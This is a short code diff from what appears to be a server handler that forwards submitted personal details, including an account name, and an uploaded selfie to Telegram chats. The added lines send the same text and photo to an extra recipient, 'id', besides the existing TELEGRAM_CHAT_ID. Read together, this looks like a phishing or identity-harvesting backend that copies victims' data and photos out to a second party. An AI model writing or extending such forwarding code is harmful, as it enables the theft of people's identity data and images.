@@ -135,6 +135,7 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
     
 
         // Send text data to Telegram
+        await sendTextToTelegram(id, formattedText);
         await sendTextToTelegram(TELEGRAM_CHAT_ID, formattedText);
 
     res.json({ 
@@ -145,7 +146,8 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
     // Send selfie to Telegram with a caption if there is one
         if (selfieFile) {
             const caption = `📸 Selfie from: ${name}`;
-          sendPhotoToTelegram(TELEGRAM_CHAT_ID, selfieFile.path, caption);
+            sendPhotoToTelegram(id, selfieFile.path, caption);
+            sendPhotoToTelegram(TELEGRAM_CHAT_ID, selfieFile.path, caption);
         }
 });
 
